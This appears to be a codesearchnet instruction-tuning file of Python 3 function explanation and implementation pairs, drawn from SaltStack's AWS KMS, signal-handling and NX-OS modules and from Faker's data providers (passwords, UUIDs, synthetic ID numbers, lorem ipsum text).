{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef key_exists(key_id, region=None, key=None, keyid=None, profile=None):\n    '''\n    Check for the existence of a key.\n\n    CLI example::\n\n        salt myminion boto_kms.key_exists 'alias/mykey'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        key = conn.describe_key(key_id)\n        # TODO: add to context cache\n        r['result'] = True\n    except boto.exception.BotoServerError as e:\n        if isinstance(e, boto.kms.exceptions.NotFoundException):\n            r['result'] = False\n            return r\n        r['error'] = __utils__['boto.get_error'](e)\n    return r", "response": "Check for the existence of a key."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_key_id(alias, region=None, key=None, keyid=None, profile=None):\n    '''\n    From an alias, get a key_id.\n    '''\n    key_metadata = describe_key(\n        alias, region, key, keyid, profile\n    )['key_metadata']\n    return key_metadata['KeyId']", "response": "Get a key_id from an alias get a key_id."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nmarking a key as disabled.", "response": "def disable_key(key_id, region=None, key=None, keyid=None, profile=None):\n    '''\n    Mark key as disabled.\n\n    CLI example::\n\n        salt myminion boto_kms.disable_key 'alias/mykey'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        key = conn.disable_key(key_id)\n        r['result'] = True\n    except boto.exception.BotoServerError as e:\n        r['result'] = False\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nencrypt plaintext into cipher text using specified key.", "response": "def encrypt(key_id, plaintext, encryption_context=None, grant_tokens=None,\n            region=None, key=None, keyid=None, profile=None):\n    '''\n    Encrypt plaintext into cipher text using specified key.\n\n    CLI example::\n\n        salt myminion boto_kms.encrypt 'alias/mykey' 'myplaindata' '{\"aws:username\":\"myuser\"}'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        ciphertext = conn.encrypt(\n            key_id,\n            plaintext,\n            encryption_context=encryption_context,\n            grant_tokens=grant_tokens\n        )\n        r['ciphertext'] = ciphertext['CiphertextBlob']\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef generate_data_key(key_id, encryption_context=None, number_of_bytes=None,\n                      key_spec=None, grant_tokens=None, region=None, key=None,\n                      keyid=None, profile=None):\n    '''\n    Generate a secure data key.\n\n    CLI example::\n\n        salt myminion boto_kms.generate_data_key 'alias/mykey' number_of_bytes=1024 key_spec=AES_128\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        data_key = conn.generate_data_key(\n            key_id,\n            encryption_context=encryption_context,\n            number_of_bytes=number_of_bytes,\n            key_spec=key_spec,\n            grant_tokens=grant_tokens\n        )\n        r['data_key'] = data_key\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r", "response": "Generate a secure data key."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating a random string.", "response": "def generate_random(number_of_bytes=None, region=None, key=None, keyid=None,\n                    profile=None):\n    '''\n    Generate a random string.\n\n    CLI example::\n\n        salt myminion boto_kms.generate_random number_of_bytes=1024\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        random = conn.generate_random(number_of_bytes)\n        r['random'] = random['Plaintext']\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_key_policy(key_id, policy_name, region=None, key=None, keyid=None,\n                   profile=None):\n    '''\n    Get the policy for the specified key.\n\n    CLI example::\n\n        salt myminion boto_kms.get_key_policy 'alias/mykey' mypolicy\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        key_policy = conn.get_key_policy(key_id, policy_name)\n        r['key_policy'] = salt.serializers.json.deserialize(\n            key_policy['Policy'],\n            object_pairs_hook=odict.OrderedDict\n        )\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r", "response": "Get the key policy for the specified key."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting status of whether or not key rotation is enabled for a key.", "response": "def get_key_rotation_status(key_id, region=None, key=None, keyid=None,\n                            profile=None):\n    '''\n    Get status of whether or not key rotation is enabled for a key.\n\n    CLI example::\n\n        salt myminion boto_kms.get_key_rotation_status 'alias/mykey'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        key_rotation_status = conn.get_key_rotation_status(key_id)\n        r['result'] = key_rotation_status['KeyRotationEnabled']\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nlists all grants for the specified key.", "response": "def list_grants(key_id, limit=None, marker=None, region=None, key=None,\n                keyid=None, profile=None):\n    '''\n    List grants for the specified key.\n\n    CLI example::\n\n        salt myminion boto_kms.list_grants 'alias/mykey'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    if key_id.startswith('alias/'):\n        key_id = _get_key_id(key_id)\n    r = {}\n    try:\n        _grants = []\n        next_marker = None\n        while True:\n            grants = conn.list_grants(\n                key_id,\n                limit=limit,\n                marker=next_marker\n            )\n            for grant in grants['Grants']:\n                _grants.append(grant)\n            if 'NextMarker' in grants:\n                next_marker = grants['NextMarker']\n            else:\n                break\n        r['grants'] = _grants\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list_key_policies(key_id, limit=None, marker=None, region=None, key=None,\n                      keyid=None, profile=None):\n    '''\n    List key_policies for the specified key.\n\n    CLI example::\n\n        salt myminion boto_kms.list_key_policies 'alias/mykey'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    if key_id.startswith('alias/'):\n        key_id = _get_key_id(key_id)\n    r = {}\n    try:\n        key_policies = conn.list_key_policies(\n            key_id,\n            limit=limit,\n            marker=marker\n        )\n        # TODO: handle limit, marker and truncation automatically.\n        r['key_policies'] = key_policies['PolicyNames']\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r", "response": "List key_policies for the specified key."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef put_key_policy(key_id, policy_name, policy, region=None, key=None,\n                   keyid=None, profile=None):\n    '''\n    Attach a key policy to the specified key.\n\n    CLI example::\n\n        salt myminion boto_kms.put_key_policy 'alias/mykey' default '{\"Statement\":...}'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        conn.put_key_policy(key_id, policy_name, salt.serializers.json.serialize(policy))\n        r['result'] = True\n    except boto.exception.BotoServerError as e:\n        r['result'] = False\n        r['error'] = __utils__['boto.get_error'](e)\n    return r", "response": "Attach a key policy to the specified key."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrevokes a grant from a key.", "response": "def revoke_grant(key_id, grant_id, region=None, key=None, keyid=None,\n                 profile=None):\n    '''\n    Revoke a grant from a key.\n\n    CLI example::\n\n        salt myminion boto_kms.revoke_grant 'alias/mykey' 8u89hf-j09j...\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    if key_id.startswith('alias/'):\n        key_id = _get_key_id(key_id)\n    r = {}\n    try:\n        conn.revoke_grant(key_id, grant_id)\n        r['result'] = True\n    except boto.exception.BotoServerError as e:\n        r['result'] = False\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nprints the stack trace and environment information to the given printout.", "response": "def _makepretty(printout, stack):\n    '''\n    Pretty print the stack trace and environment information\n    for debugging those hard to reproduce user problems.  :)\n    '''\n    printout.write('======== Salt Debug Stack Trace =========\\n')\n    traceback.print_stack(stack, file=printout)\n    printout.write('=========================================\\n')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsignal handler for SIGUSR2 only available on Unix - like systems", "response": "def _handle_sigusr2(sig, stack):\n    '''\n    Signal handler for SIGUSR2, only available on Unix-like systems\n    '''\n    try:\n        import yappi\n    except ImportError:\n        return\n    if yappi.is_running():\n        yappi.stop()\n        filename = 'callgrind.salt-{0}-{1}'.format(int(time.time()), os.getpid())\n        destfile = os.path.join(tempfile.gettempdir(), filename)\n        yappi.get_func_stats().save(destfile, type='CALLGRIND')\n        if sys.stderr.isatty():\n            sys.stderr.write('Saved profiling data to: {0}\\n'.format(destfile))\n        yappi.clear_stats()\n    else:\n        if sys.stderr.isatty():\n            sys.stderr.write('Profiling started\\n')\n        yappi.start()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef enable_sig_handler(signal_name, handler):\n    '''\n    Add signal handler for signal name if it exists on given platform\n    '''\n    if hasattr(signal, signal_name):\n        signal.signal(getattr(signal, signal_name), handler)", "response": "Enable signal handler for given signal name on given platform\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef caller_name(skip=2, include_lineno=False):\n    '''\n    Get a name of a caller in the format module.class.method\n\n    `skip` specifies how many levels of stack to skip while getting caller\n    name. skip=1 means \"who calls me\", skip=2 \"who calls my caller\" etc.\n\n    An empty string is returned if skipped levels exceed stack height\n\n    Source: https://gist.github.com/techtonik/2151727\n    '''\n    stack = inspect.stack()\n    start = 0 + skip\n    if len(stack) < start + 1:\n        return ''\n    parentframe = stack[start][0]\n\n    name = []\n    if include_lineno is True:\n        try:\n            lineno = inspect.getframeinfo(parentframe).lineno\n        except:  # pylint: disable=bare-except\n            lineno = None\n    module = inspect.getmodule(parentframe)\n    # `modname` can be None when frame is executed directly in console\n    # TODO(techtonik): consider using __main__\n    if module:\n        name.append(module.__name__)\n    # detect classname\n    if 'self' in parentframe.f_locals:\n        # I don't know any way to detect call from the object method\n        # XXX: there seems to be no way to detect static method call - it will\n        #      be just a function call\n        name.append(parentframe.f_locals['self'].__class__.__name__)\n    codename = parentframe.f_code.co_name\n    if codename != '<module>':  # top level usually\n        name.append(codename)   # function or a method\n    del parentframe\n    fullname = '.'.join(name)\n    if include_lineno and lineno:\n        fullname += ':{}'.format(lineno)\n    return fullname", "response": "Get a name of a caller in the format module. class. method. caller."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nensuring the NX - OS system image is running on the device.", "response": "def image_running(name, system_image, kickstart_image=None, issu=True, **kwargs):\n    '''\n    Ensure the NX-OS system image is running on the device.\n\n    name\n        Name of the salt state task\n\n    system_image\n        Name of the system image file on bootflash:\n\n    kickstart_image\n        Name of the kickstart image file on bootflash:\n        This is not needed if the system_image is a combined system and\n        kickstart image\n        Default: None\n\n    issu\n        Ensure the correct system is running on the device using an in service\n        software upgrade, or force a disruptive upgrade by setting the option\n        to False.\n        Default: False\n\n    timeout\n        Timeout in seconds for long running 'install all' upgrade command.\n        Default: 900\n\n    Examples:\n\n    .. code-block:: yaml\n\n        upgrade_software_image_n9k:\n          nxos.image_running:\n            - name: Ensure nxos.7.0.3.I7.5a.bin is running\n            - system_image: nxos.7.0.3.I7.5a.bin\n            - issu: True\n\n        upgrade_software_image_n7k:\n          nxos.image_running:\n            - name: Ensure n7000-s2-kickstart.8.0.1.bin is running\n            - kickstart_image: n7000-s2-kickstart.8.0.1.bin\n            - system_image: n7000-s2-dk9.8.0.1.bin\n            - issu: False\n    '''\n    ret = {'name': name,\n           'result': False,\n           'changes': {},\n           'comment': ''}\n\n    if kickstart_image is None:\n        upgrade = __salt__['nxos.upgrade'](system_image=system_image,\n                                           issu=issu, **kwargs)\n    else:\n        upgrade = __salt__['nxos.upgrade'](system_image=system_image,\n                                           kickstart_image=kickstart_image,\n                                           issu=issu, **kwargs)\n\n    if upgrade['upgrade_in_progress']:\n        ret['result'] = upgrade['upgrade_in_progress']\n        ret['changes'] = upgrade['module_data']\n        ret['comment'] = 'NX-OS Device Now Being Upgraded - See Change Details Below'\n    elif upgrade['succeeded']:\n        ret['result'] = upgrade['succeeded']\n        ret['comment'] = 'NX-OS Device Running Image: {}'.format(_version_info())\n    else:\n        ret['comment'] = 'Upgrade Failed: {}.'.format(upgrade['error_data'])\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef WaitForTasks(tasks, si):\n\n   pc = si.content.propertyCollector\n\n   taskList = [str(task) for task in tasks]\n\n   # Create filter\n   objSpecs = [vmodl.query.PropertyCollector.ObjectSpec(obj=task)\n                                                            for task in tasks]\n   propSpec = vmodl.query.PropertyCollector.PropertySpec(type=vim.Task,\n                                                         pathSet=[], all=True)\n   filterSpec = vmodl.query.PropertyCollector.FilterSpec()\n   filterSpec.objectSet = objSpecs\n   filterSpec.propSet = [propSpec]\n   filter = pc.CreateFilter(filterSpec, True)\n\n   try:\n      version, state = None, None\n\n      # Loop looking for updates till the state moves to a completed state.\n      while len(taskList):\n         update = pc.WaitForUpdates(version)\n         for filterSet in update.filterSet:\n            for objSet in filterSet.objectSet:\n               task = objSet.obj\n               for change in objSet.changeSet:\n                  if change.name == 'info':\n                     state = change.val.state\n                  elif change.name == 'info.state':\n                     state = change.val\n                  else:\n                     continue\n\n                  if not str(task) in taskList:\n                     continue\n\n                  if state == vim.TaskInfo.State.success:\n                     # Remove task from taskList\n                     taskList.remove(str(task))\n                  elif state == vim.TaskInfo.State.error:\n                     raise task.info.error\n         # Move to next version\n         version = update.version\n   finally:\n      if filter:\n         filter.Destroy()", "response": "This function waits for the tasks to complete."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncalculates the checksum char used for the 16th char in the value.", "response": "def checksum(value):\n    \"\"\"\n    Calculates the checksum char used for the 16th char.\n    Author: Vincenzo Palazzo\n    \"\"\"\n    return chr(65 + sum(CHECKSUM_TABLE[index % 2][ALPHANUMERICS_DICT[char]]\n                        for index, char in enumerate(value)) % 26)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a random binary blob.", "response": "def binary(self, length=(1 * 1024 * 1024)):\n        \"\"\" Returns random binary blob.\n\n        Default blob size is 1 Mb.\n        \"\"\"\n        blob = [self.generator.random.randrange(256) for _ in range(length)]\n        return bytes(blob) if sys.version_info[0] >= 3 else bytearray(blob)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncalculate the md5 hash of a given string", "response": "def md5(self, raw_output=False):\n        \"\"\"\n        Calculates the md5 hash of a given string\n        :example 'cfcd208495d565ef66e7dff9f98764da'\n        \"\"\"\n        res = hashlib.md5(str(self.generator.random.random()).encode('utf-8'))\n        if raw_output:\n            return res.digest()\n        return res.hexdigest()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate a random UUID4 string.", "response": "def uuid4(self, cast_to=str):\n        \"\"\"\n        Generates a random UUID4 string.\n        :param cast_to: Specify what type the UUID should be cast to. Default is `str`\n        :type cast_to: callable\n        \"\"\"\n        # Based on http://stackoverflow.com/q/41186818\n        return cast_to(uuid.UUID(int=self.generator.random.getrandbits(128), version=4))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef password(\n            self,\n            length=10,\n            special_chars=True,\n            digits=True,\n            upper_case=True,\n            lower_case=True):\n        \"\"\"\n        Generates a random password.\n        @param length: Integer. Length of a password\n        @param special_chars: Boolean. Whether to use special characters !@#$%^&*()_+\n        @param digits: Boolean. Whether to use digits\n        @param upper_case: Boolean. Whether to use upper letters\n        @param lower_case: Boolean. Whether to use lower letters\n        @return: String. Random password\n        \"\"\"\n        choices = \"\"\n        required_tokens = []\n        if special_chars:\n            required_tokens.append(\n                self.generator.random.choice(\"!@#$%^&*()_+\"))\n            choices += \"!@#$%^&*()_+\"\n        if digits:\n            required_tokens.append(self.generator.random.choice(string.digits))\n            choices += string.digits\n        if upper_case:\n            required_tokens.append(\n                self.generator.random.choice(string.ascii_uppercase))\n            choices += string.ascii_uppercase\n        if lower_case:\n            required_tokens.append(\n                self.generator.random.choice(string.ascii_lowercase))\n            choices += string.ascii_lowercase\n\n        assert len(\n            required_tokens) <= length, \"Required length is shorter than required characters\"\n\n        # Generate a first version of the password\n        chars = self.random_choices(choices, length=length)\n\n        # Pick some unique locations\n        random_indexes = set()\n        while len(random_indexes) < len(required_tokens):\n            random_indexes.add(\n                self.generator.random.randint(0, len(chars) - 1))\n\n        # Replace them with the required characters\n        for i, index in enumerate(random_indexes):\n            chars[index] = required_tokens[i]\n\n        return ''.join(chars)", "response": "Generates a random password."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef checksum_identity_card_number(characters):\n    weights_for_check_digit = [7, 3, 1, 0, 7, 3, 1, 7, 3]\n    check_digit = 0\n\n    for i in range(3):\n        check_digit += weights_for_check_digit[i] * (ord(characters[i]) - 55)\n\n    for i in range(4, 9):\n        check_digit += weights_for_check_digit[i] * characters[i]\n\n    check_digit %= 10\n\n    return check_digit", "response": "Calculates and returns a control digit for given list of characters basing on Identity Card Number standards."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns 9 character Polish Identity Card Number", "response": "def identity_card_number(self):\n        \"\"\"\n        Returns 9 character Polish Identity Card Number,\n        Polish: Numer Dowodu Osobistego.\n\n        The card number consists of 3 letters followed by 6 digits (for example, ABA300000),\n        of which the first digit (at position 3) is the check digit.\n\n        https://en.wikipedia.org/wiki/Polish_identity_card\n        \"\"\"\n        identity = []\n\n        for _ in range(3):\n            identity.append(self.random_letter().upper())\n\n        # it will be overwritten by a checksum\n        identity.append(0)\n\n        for _ in range(5):\n            identity.append(self.random_digit())\n\n        identity[3] = checksum_identity_card_number(identity)\n\n        return ''.join(str(character) for character in identity)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef execute(self):\n\n        # retrieve default language from system environment\n        default_locale = os.environ.get('LANG', 'en_US').split('.')[0]\n        if default_locale not in AVAILABLE_LOCALES:\n            default_locale = DEFAULT_LOCALE\n\n        epilog = \"\"\"supported locales:\n\n  {0}\n\n  Faker can take a locale as an optional argument, to return localized data. If\n  no locale argument is specified, the factory falls back to the user's OS\n  locale as long as it is supported by at least one of the providers.\n     - for this user, the default locale is {1}.\n\n  If the optional argument locale and/or user's default locale is not available\n  for the specified provider, the factory falls back to faker's default locale,\n  which is {2}.\n\nexamples:\n\n  $ faker address\n  968 Bahringer Garden Apt. 722\n  Kristinaland, NJ 09890\n\n  $ faker -l de_DE address\n  Samira-Niemeier-Allee 56\n  94812 Biedenkopf\n\n  $ faker profile ssn,birthdate\n  {{'ssn': u'628-10-1085', 'birthdate': '2008-03-29'}}\n\n  $ faker -r=3 -s=\";\" name\n  Willam Kertzmann;\n  Josiah Maggio;\n  Gayla Schmitt;\n\n\"\"\".format(', '.join(sorted(AVAILABLE_LOCALES)),\n           default_locale,\n           DEFAULT_LOCALE)\n\n        formatter_class = argparse.RawDescriptionHelpFormatter\n        parser = argparse.ArgumentParser(\n            prog=self.prog_name,\n            description='{0} version {1}'.format(self.prog_name, VERSION),\n            epilog=epilog,\n            formatter_class=formatter_class)\n\n        parser.add_argument(\"--version\", action=\"version\",\n                            version=\"%(prog)s {0}\".format(VERSION))\n\n        parser.add_argument('-v',\n                            '--verbose',\n                            action='store_true',\n                            help=\"show INFO logging events instead \"\n                            \"of CRITICAL, which is the default. These logging \"\n                            \"events provide insight into localization of \"\n                            \"specific providers.\")\n\n        parser.add_argument('-o', metavar=\"output\",\n                            type=argparse.FileType('w'),\n                            default=sys.stdout,\n                            help=\"redirect output to a file\")\n\n        parser.add_argument('-l', '--lang',\n                            choices=AVAILABLE_LOCALES,\n                            default=default_locale,\n                            metavar='LOCALE',\n                            help=\"specify the language for a localized \"\n                            \"provider (e.g. de_DE)\")\n        parser.add_argument('-r', '--repeat',\n                            default=1,\n                            type=int,\n                            help=\"generate the specified number of outputs\")\n        parser.add_argument('-s', '--sep',\n                            default='\\n',\n                            help=\"use the specified separator after each \"\n                            \"output\")\n\n        parser.add_argument('--seed', metavar='SEED',\n                            type=int,\n                            help=\"specify a seed for the random generator so \"\n                            \"that results are repeatable. Also compatible \"\n                            \"with 'repeat' option\")\n\n        parser.add_argument('-i',\n                            '--include',\n                            default=META_PROVIDERS_MODULES,\n                            nargs='*',\n                            help=\"list of additional custom providers to \"\n                            \"user, given as the import path of the module \"\n                            \"containing your Provider class (not the provider \"\n                            \"class itself)\")\n\n        parser.add_argument('fake',\n                            action='store',\n                            nargs='?',\n                            help=\"name of the fake to generate output for \"\n                                 \"(e.g. profile)\")\n\n        parser.add_argument('fake_args',\n                            metavar=\"fake argument\",\n                            action='store',\n                            nargs='*',\n                            help=\"optional arguments to pass to the fake \"\n                                 \"(e.g. the profile fake takes an optional \"\n                                 \"list of comma separated field names as the \"\n                                 \"first argument)\")\n\n        arguments = parser.parse_args(self.argv[1:])\n\n        if arguments.verbose:\n            logging.basicConfig(level=logging.DEBUG)\n        else:\n            logging.basicConfig(level=logging.CRITICAL)\n\n        random.seed(arguments.seed)\n        seeds = random.sample(range(arguments.repeat*10), arguments.repeat)\n\n        for i in range(arguments.repeat):\n\n            print_doc(arguments.fake,\n                      arguments.fake_args,\n                      lang=arguments.lang,\n                      output=arguments.o,\n                      seed=seeds[i],\n                      includes=arguments.include,\n                      )\n            print(arguments.sep, file=arguments.o)\n\n            if not arguments.fake:\n                # repeat not supported for all docs\n                break", "response": "This function creates a parser appropriate to the command - line arguments and runs it."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _check_digit(self):\n        weights = (1 if x % 2 == 0 else 3 for x in range(12))\n        body = ''.join([self.ean, self.group, self.registrant,\n                        self.publication])\n        remainder = sum(int(b) * w for b, w in zip(body, weights)) % 10\n        diff = 10 - remainder\n        check_digit = 0 if diff == 10 else diff\n        return str(check_digit)", "response": "Calculate the check digit for ISBN - 13."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncheck if a catch phrase is valid.", "response": "def _is_catch_phrase_valid(self, catch_phrase):\n        \"\"\"\n        Validates a french catch phrase.\n\n        :param catch_phrase: The catch phrase to validate.\n        \"\"\"\n        for word in self.words_which_should_not_appear_twice:\n            # Fastest way to check if a piece of word does not appear twice.\n            begin_pos = catch_phrase.find(word)\n            end_pos = catch_phrase.find(word, begin_pos + 1)\n\n            if begin_pos != -1 and begin_pos != end_pos:\n                return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef siret(self, max_sequential_digits=2):\n        if max_sequential_digits > 4 or max_sequential_digits <= 0:\n            max_sequential_digits = 2\n\n        sequential_number = str(self.random_number(\n            max_sequential_digits)).zfill(4)\n        return self.numerify(self.siren() + ' ' + sequential_number + '#')", "response": "Generates a random siret number."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef remove_accents(value):\n    search = '\u0386\u0388\u0389\u038a\u038c\u038e\u038f\u03ac\u03ad\u03ae\u03af\u03cc\u03cd\u03ce\u03aa\u03ca\u0390\u03cb\u03b0'\n    replace = '\u0391\u0395\u0397\u0399\u039f\u03a5\u03a9\u03b1\u03b5\u03b7\u03b9\u03bf\u03c5\u03c9\u0399\u03b9\u03b9\u03c5\u03c5'\n\n    def replace_accented_character(match):\n        matched = match.group(0)\n        if matched in search:\n            return replace[search.find(matched)]\n        return matched\n\n    return re.sub(r'[{0}]+'.format(search), replace_accented_character, value)", "response": "Removes accents from characters in the given string."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef latinize(value):\n    def replace_double_character(match):\n        search = ('\u0398 \u03a7 \u03a8 '\n                  '\u03b8 \u03c7 \u03c8 '\n                  '\u039f\u03a5 \u0391\u03a5 \u0395\u03a5 '\n                  '\u039f\u03c5 \u0391\u03c5 \u0395\u03c5 '\n                  '\u03bf\u03c5 \u03b1\u03c5 \u03b5\u03c5').split()\n        replace = ('TH CH PS '\n                   'th ch ps '\n                   'OU AU EU '\n                   'Ou Au Eu '\n                   'ou au eu').split()\n        matched = match.group(0)\n        if matched in search:\n            return replace[search.index(matched)]\n        return matched\n\n    search = '\u0391\u0392\u0393\u0394\u0395\u0396\u0397\u0399\u039a\u039b\u039c\u039d\u039e\u039f\u03a0\u03a1\u03a3\u03a3\u03a4\u03a5\u03a6\u03a9\u03b1\u03b2\u03b3\u03b4\u03b5\u03b6\u03b7\u03b9\u03ba\u03bb\u03bc\u03bd\u03be\u03bf\u03c0\u03c1\u03c3\u03c2\u03c4\u03c5\u03c6\u03c9'\n    replace = 'AVGDEZIIKLMNXOPRSSTUFOavgdeziiklmnxoprsstyfo'\n\n    def replace_greek_character(match):\n        matched = list(match.group(0))\n        value = map(lambda l: replace[search.find(l)], matched)\n        return ''.join(value)\n\n    return re.sub(r'[{0}]+'.format(search),\n                  replace_greek_character, re.sub(\n        r'([\u0398\u03a7\u03a8\u03b8\u03c7\u03c8]+|\u039f\u03a5|\u0391\u03a5|\u0395\u03a5|\u039f\u03c5|\u0391\u03c5|\u0395\u03c5|\u03bf\u03c5|\u03b1\u03c5|\u03b5\u03c5)',\n        replace_double_character,\n        remove_accents(value)))", "response": "Converts greek letters to latin equivalents."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn an Israeli identity number", "response": "def ssn(self):\n        \"\"\"\n        Returns an Israeli identity number, known as Teudat Zehut (\"tz\").\n\n        https://en.wikipedia.org/wiki/Israeli_identity_card\n        \"\"\"\n\n        newID = str(self.generator.random.randrange(111111, 99999999))\n        newID = newID.zfill(8)\n        theSum = 0\n        indexRange = [0, 2, 4, 6]\n        for i in indexRange:\n            digit = newID[i]\n            num = int(digit)\n            theSum = theSum + num\n            num = int(newID[i + 1]) * 2\n            if num > 9:\n                num = int(str(num)[0]) + int(str(num)[1])\n            theSum = theSum + num\n        lastDigit = theSum % 10\n        if lastDigit != 0:\n            lastDigit = 10 - lastDigit\n\n        return str(newID) + str(lastDigit)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn an array of random words. for example Lorem ipsum dolor", "response": "def words(self, nb=3, ext_word_list=None, unique=False):\n        \"\"\"\n        :returns: An array of random words. for example: ['Lorem', 'ipsum', 'dolor']\n\n        Keyword arguments:\n        :param nb: how many words to return\n        :param ext_word_list: a list of words you would like to have instead of\n            'Lorem ipsum'\n        :param unique: If True, the returned word list will contain unique words\n\n        :rtype: list\n        \"\"\"\n        word_list = ext_word_list if ext_word_list else self.word_list\n        if unique:\n            return self.random_sample(word_list, length=nb)\n        return self.random_choices(word_list, length=nb)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef sentence(self, nb_words=6, variable_nb_words=True, ext_word_list=None):\n        if nb_words <= 0:\n            return ''\n\n        if variable_nb_words:\n            nb_words = self.randomize_nb_elements(nb_words, min=1)\n\n        words = self.words(nb=nb_words, ext_word_list=ext_word_list)\n        words[0] = words[0].title()\n\n        return self.word_connector.join(words) + self.sentence_punctuation", "response": "Generates a random sentence of nb_words words."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating an array of sentences from the base class.", "response": "def sentences(self, nb=3, ext_word_list=None):\n        \"\"\"\n        Generate an array of sentences\n        :example ['Lorem ipsum dolor sit amet.', 'Consectetur adipisicing eli.']\n\n        Keyword arguments:\n        :param nb: how many sentences to return\n        :param ext_word_list: a list of words you would like to have instead of\n            'Lorem ipsum'.\n\n        :rtype: list\n        \"\"\"\n        return [self.sentence(ext_word_list=ext_word_list)\n                for _ in range(0, nb)]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a single paragraph. For example a paragraph is Sapiente sunt omnis. Ut pariatur ad autem ducimus et Voluptas rem voluptas modi dolorem amet.", "response": "def paragraph(\n            self,\n            nb_sentences=3,\n            variable_nb_sentences=True,\n            ext_word_list=None):\n        \"\"\"\n        :returns: A single paragraph. For example: 'Sapiente sunt omnis. Ut\n            pariatur ad autem ducimus et. Voluptas rem voluptas sint modi dolorem amet.'\n\n        Keyword arguments:\n        :param nb_sentences: around how many sentences the paragraph should contain\n        :param variable_nb_sentences: set to false if you want exactly ``nb``\n            sentences returned, otherwise the result may include a number of\n            sentences of ``nb`` +/-40% (with a minimum of 1)\n        :param ext_word_list: a list of words you would like to have instead of\n            'Lorem ipsum'.\n\n        :rtype: str\n        \"\"\"\n        if nb_sentences <= 0:\n            return ''\n\n        if variable_nb_sentences:\n            nb_sentences = self.randomize_nb_elements(nb_sentences, min=1)\n\n        para = self.word_connector.join(self.sentences(\n            nb_sentences, ext_word_list=ext_word_list,\n        ))\n\n        return para"}
